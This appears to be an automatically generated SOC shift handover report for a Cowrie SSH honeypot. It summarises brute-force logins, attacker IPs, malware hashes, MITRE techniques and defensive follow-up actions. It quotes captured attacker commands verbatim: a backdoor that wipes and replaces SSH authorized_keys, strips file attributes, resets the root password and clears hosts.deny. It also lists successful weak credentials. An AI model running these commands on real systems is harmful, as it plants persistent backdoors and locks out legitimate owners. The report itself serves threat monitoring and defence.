# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-28 |
| **Generated At** | 2026-03-28T16:32:16Z |
| **Shift Time** | 16:32 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **47** |
| Confirmed Threats | **39** |
| False Positives Filtered | **8** (17.0%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **17** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **40** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **28** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **15** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `nobody` | 4 |
| `Support` | 2 |
| `debian` | 2 |
| `345gs5662d34` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1q2w3e4r` | 2 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `nobody2009` | 1 |
| `123123123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `nobody` | `nobody2009` | 1 |
| `Nobody` | `1q2w3e4r` | 1 |
| `centos` | `123123123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123abc` | `65.20.163.103` | 2026-03-28T15:26:15 |
| `root` | `reset123` | `112.196.70.142` | 2026-03-28T15:29:58 |
| `root` | `3245gs5662d34` | `112.196.70.142` | 2026-03-28T15:30:00 |
| `root` | `asdzxcqwe` | `203.83.231.93` | 2026-03-28T15:55:16 |
| `root` | `delta` | `113.137.40.250` | 2026-03-28T15:59:11 |
| `root` | `3245gs5662d34` | `113.137.40.250` | 2026-03-28T15:59:15 |
| `root` | `ubuntu` | `113.250.188.218` | 2026-03-28T16:10:15 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:zyM3zzwuCn6o"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `203.83.231.93`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `113.137.40.250`, `112.196.70.142`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **28** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 5 | HIGH |
| `AS9829` | National Internet Backbone | 2 | LOW |
| `AS134768` | CHINANET SHAANXI province Cloud Base network | 2 | HIGH |
| `AS14754` | TELECOMUNICACIONES DE GUATEMALA, SOCIEDAD ANONIMA | 1 | HIGH |
| `AS8402` | PJSC Vimpelcom | 1 | HIGH |
| `AS17501` | WorldLink Communications Pvt Ltd | 1 | MEDIUM |
| `AS7489` | HostUS | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7d4b6dd11756

| Field | Detail |
|---|---|
| **Source IP** | `65.20.163[.]103` |
| **First Seen** | 2026-03-28 15:26 |
| **Last Seen** | 2026-03-28 15:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 15:26:14` | `cowrie.session.connect` |
| `2026-03-28 15:26:14` | `cowrie.client.version` |
| `2026-03-28 15:26:14` | `cowrie.client.kex` |
| `2026-03-28 15:26:15` | `cowrie.login.success` |
| `2026-03-28 15:26:15` | `cowrie.direct-tcpip.request` |
| `2026-03-28 15:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.163[.]103` to AbuseIPDB if not already reported
- [ ] Block `65.20.163[.]103` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e85b305d352

| Field | Detail |
|---|---|
| **Source IP** | `112.196.70[.]142` |
| **First Seen** | 2026-03-28 15:29 |
| **Last Seen** | 2026-03-28 15:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 15:29:57` | `cowrie.session.connect` |
| `2026-03-28 15:29:57` | `cowrie.client.version` |
| `2026-03-28 15:29:57` | `cowrie.client.kex` |
| `2026-03-28 15:29:58` | `cowrie.login.success` |
| `2026-03-28 15:29:58` | `cowrie.session.params` |
| `2026-03-28 15:29:58` | `cowrie.command.input` |
| `2026-03-28 15:29:58` | `cowrie.command.failed` |
| `2026-03-28 15:29:58` | `cowrie.log.closed` |
| `2026-03-28 15:29:58` | `cowrie.session.params` |
| `2026-03-28 15:29:58` | `cowrie.command.input` |
| `2026-03-28 15:29:58` | `cowrie.session.file_download` |
| `2026-03-28 15:29:58` | `cowrie.log.closed` |
| `2026-03-28 15:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.70[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.196.70[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-245a20a38daa

| Field | Detail |
|---|---|
| **Source IP** | `112.196.70[.]142` |
| **First Seen** | 2026-03-28 15:29 |
| **Last Seen** | 2026-03-28 15:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 15:29:59` | `cowrie.session.connect` |
| `2026-03-28 15:29:59` | `cowrie.client.version` |
| `2026-03-28 15:29:59` | `cowrie.client.kex` |
| `2026-03-28 15:30:00` | `cowrie.login.success` |
| `2026-03-28 15:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.70[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.196.70[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d5307011c49

| Field | Detail |
|---|---|
| **Source IP** | `203.83.231[.]93` |
| **First Seen** | 2026-03-28 15:55 |
| **Last Seen** | 2026-03-28 15:55 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:zyM3zzwuCn6o"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 15:55:15` | `cowrie.session.connect` |
| `2026-03-28 15:55:15` | `cowrie.client.version` |
| `2026-03-28 15:55:15` | `cowrie.client.kex` |
| `2026-03-28 15:55:16` | `cowrie.login.success` |
| `2026-03-28 15:55:16` | `cowrie.session.params` |
| `2026-03-28 15:55:16` | `cowrie.command.input` |
| `2026-03-28 15:55:16` | `cowrie.command.failed` |
| `2026-03-28 15:55:17` | `cowrie.log.closed` |
| `2026-03-28 15:55:17` | `cowrie.session.params` |
| `2026-03-28 15:55:17` | `cowrie.command.input` |
| `2026-03-28 15:55:17` | `cowrie.session.file_download` |
| `2026-03-28 15:55:17` | `cowrie.log.closed` |
| `2026-03-28 15:55:31` | `cowrie.session.params` |
| `2026-03-28 15:55:31` | `cowrie.command.input` |
| `2026-03-28 15:55:31` | `cowrie.log.closed` |
| `2026-03-28 15:55:31` | `cowrie.session.params` |
| `2026-03-28 15:55:31` | `cowrie.command.input` |
| `2026-03-28 15:55:32` | `cowrie.log.closed` |
| `2026-03-28 15:55:32` | `cowrie.session.params` |
| `2026-03-28 15:55:32` | `cowrie.command.input` |
| `2026-03-28 15:55:32` | `cowrie.session.file_download` |
| `2026-03-28 15:55:32` | `cowrie.log.closed` |
| `2026-03-28 15:55:33` | `cowrie.session.params` |
| `2026-03-28 15:55:33` | `cowrie.command.input` |
| `2026-03-28 15:55:33` | `cowrie.log.closed` |
| `2026-03-28 15:55:33` | `cowrie.session.params` |
| `2026-03-28 15:55:33` | `cowrie.command.input` |
| `2026-03-28 15:55:34` | `cowrie.log.closed` |
| `2026-03-28 15:55:34` | `cowrie.session.params` |
| `2026-03-28 15:55:34` | `cowrie.command.input` |
| `2026-03-28 15:55:34` | `cowrie.command.input` |
| `2026-03-28 15:55:34` | `cowrie.log.closed` |
| `2026-03-28 15:55:35` | `cowrie.session.params` |
| `2026-03-28 15:55:35` | `cowrie.command.input` |
| `2026-03-28 15:55:35` | `cowrie.log.closed` |
| `2026-03-28 15:55:35` | `cowrie.session.params` |
| `2026-03-28 15:55:35` | `cowrie.command.input` |
| `2026-03-28 15:55:35` | `cowrie.log.closed` |
| `2026-03-28 15:55:36` | `cowrie.session.params` |
| `2026-03-28 15:55:36` | `cowrie.command.input` |
| `2026-03-28 15:55:36` | `cowrie.log.closed` |
| `2026-03-28 15:55:36` | `cowrie.session.params` |
| `2026-03-28 15:55:36` | `cowrie.command.input` |
| `2026-03-28 15:55:37` | `cowrie.log.closed` |
| `2026-03-28 15:55:37` | `cowrie.session.params` |
| `2026-03-28 15:55:37` | `cowrie.command.input` |
| `2026-03-28 15:55:37` | `cowrie.log.closed` |
| `2026-03-28 15:55:38` | `cowrie.session.params` |
| `2026-03-28 15:55:38` | `cowrie.command.input` |
| `2026-03-28 15:55:38` | `cowrie.log.closed` |
| `2026-03-28 15:55:38` | `cowrie.session.params` |
| `2026-03-28 15:55:38` | `cowrie.command.input` |
| `2026-03-28 15:55:38` | `cowrie.log.closed` |
| `2026-03-28 15:55:39` | `cowrie.session.params` |
| `2026-03-28 15:55:39` | `cowrie.command.input` |
| `2026-03-28 15:55:39` | `cowrie.log.closed` |
| `2026-03-28 15:55:39` | `cowrie.session.params` |
| `2026-03-28 15:55:39` | `cowrie.command.input` |
| `2026-03-28 15:55:40` | `cowrie.log.closed` |
| `2026-03-28 15:55:40` | `cowrie.session.params` |
| `2026-03-28 15:55:40` | `cowrie.command.input` |
| `2026-03-28 15:55:40` | `cowrie.log.closed` |
| `2026-03-28 15:55:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.83.231[.]93` to AbuseIPDB if not already reported
- [ ] Block `203.83.231[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31bd66e2c39

| Field | Detail |
|---|---|
| **Source IP** | `113.137.40[.]250` |
| **First Seen** | 2026-03-28 15:59 |
| **Last Seen** | 2026-03-28 15:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 15:59:10` | `cowrie.session.connect` |
| `2026-03-28 15:59:10` | `cowrie.client.version` |
| `2026-03-28 15:59:10` | `cowrie.client.kex` |
| `2026-03-28 15:59:11` | `cowrie.login.success` |
| `2026-03-28 15:59:11` | `cowrie.session.params` |
| `2026-03-28 15:59:11` | `cowrie.command.input` |
| `2026-03-28 15:59:11` | `cowrie.command.failed` |
| `2026-03-28 15:59:11` | `cowrie.log.closed` |
| `2026-03-28 15:59:12` | `cowrie.session.params` |
| `2026-03-28 15:59:12` | `cowrie.command.input` |
| `2026-03-28 15:59:12` | `cowrie.session.file_download` |
| `2026-03-28 15:59:12` | `cowrie.log.closed` |
| `2026-03-28 15:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.137.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.137.40[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd73c7558fb2

| Field | Detail |
|---|---|
| **Source IP** | `113.137.40[.]250` |
| **First Seen** | 2026-03-28 15:59 |
| **Last Seen** | 2026-03-28 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 15:59:14` | `cowrie.session.connect` |
| `2026-03-28 15:59:14` | `cowrie.client.version` |
| `2026-03-28 15:59:14` | `cowrie.client.kex` |
| `2026-03-28 15:59:15` | `cowrie.login.success` |
| `2026-03-28 15:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.137.40[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.137.40[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e92a75a639

| Field | Detail |
|---|---|
| **Source IP** | `113.250.188[.]218` |
| **First Seen** | 2026-03-28 16:10 |
| **Last Seen** | 2026-03-28 16:11 |
| **Session Duration** | 50s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-28 16:10:14` | `cowrie.session.connect` |
| `2026-03-28 16:10:14` | `cowrie.client.version` |
| `2026-03-28 16:10:14` | `cowrie.client.kex` |
| `2026-03-28 16:10:15` | `cowrie.login.success` |
| `2026-03-28 16:11:04` | `cowrie.session.file_upload` |
| `2026-03-28 16:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.250.188[.]218` to AbuseIPDB if not already reported
- [ ] Block `113.250.188[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `203.83.231[.]93` | **7** | 2026-03-28 14:50 | 2026-03-28 16:01 | 12m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]176` | **3** | 2026-03-28 16:23 | 2026-03-28 16:23 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.102.61[.]21` | 1 | 2026-03-28 16:22 | 2026-03-28 16:22 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.196.70[.]142` | 1 | 2026-03-28 15:29 | 2026-03-28 15:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.137.40[.]250` | 1 | 2026-03-28 15:59 | 2026-03-28 15:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.19.53[.]72` | 1 | 2026-03-28 14:40 | 2026-03-28 14:40 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.123.116[.]93` | 1 | 2026-03-28 16:26 | 2026-03-28 16:26 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `128.185.218[.]118` | 1 | 2026-03-28 15:19 | 2026-03-28 15:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `160.119.76[.]57` | 1 | 2026-03-28 15:39 | 2026-03-28 15:39 | 5s | 0 | `T1592` | 🟢 LOW |
| `174.1.36[.]218` | 1 | 2026-03-28 15:42 | 2026-03-28 15:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.222[.]56` | 1 | 2026-03-28 15:57 | 2026-03-28 15:57 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.145[.]55` | 1 | 2026-03-28 16:22 | 2026-03-28 16:22 | 14s | 0 | `T1592` | 🟢 LOW |
| `186.201.54[.]90` | 1 | 2026-03-28 16:02 | 2026-03-28 16:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.56.162[.]181` | 1 | 2026-03-28 15:21 | 2026-03-28 15:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.89.197[.]82` | 1 | 2026-03-28 15:26 | 2026-03-28 15:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.170.50[.]2` | 1 | 2026-03-28 15:01 | 2026-03-28 15:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.68.226[.]171` | 1 | 2026-03-28 15:00 | 2026-03-28 15:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.37.150[.]6` | 1 | 2026-03-28 14:42 | 2026-03-28 14:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.143[.]45` | 1 | 2026-03-28 15:38 | 2026-03-28 15:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.167[.]160` | 1 | 2026-03-28 16:16 | 2026-03-28 16:16 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.204[.]88` | 1 | 2026-03-28 15:06 | 2026-03-28 15:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.233[.]110` | 1 | 2026-03-28 15:46 | 2026-03-28 15:46 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.179.78[.]247` | 1 | 2026-03-28 16:01 | 2026-03-28 16:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.231.89[.]24` | 1 | 2026-03-28 15:28 | 2026-03-28 15:28 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.171.145[.]55` | MY | Celcom Axiata Berhad | **100** ⚠️ | 5 |
| `65.20.163[.]103` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 20 |
| `65.20.143[.]45` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 27 |
| `113.19.53[.]72` | PH | CONVERGE INFORMATION AND COMMUNICATIONS TECHNOLOGY SOLUTIONS, INC | **100** ⚠️ | 13 |
| `113.250.188[.]218` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 9 |
| `186.201.54[.]90` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `128.185.218[.]118` | IN | BHARTI-AIRTEL | **100** ⚠️ | 47 |
| `66.132.186[.]176` | US | Censys, Inc. | **100** ⚠️ | 9 |
| `118.123.116[.]93` | CN | CHINANET Sichuan province network | **100** ⚠️ | 29 |
| `160.119.76[.]57` | NL | HostUS Solutions LLC | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 35 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 21 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 47 cases |
| Tool 34  | Credential Extractor        | ✅ 28 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
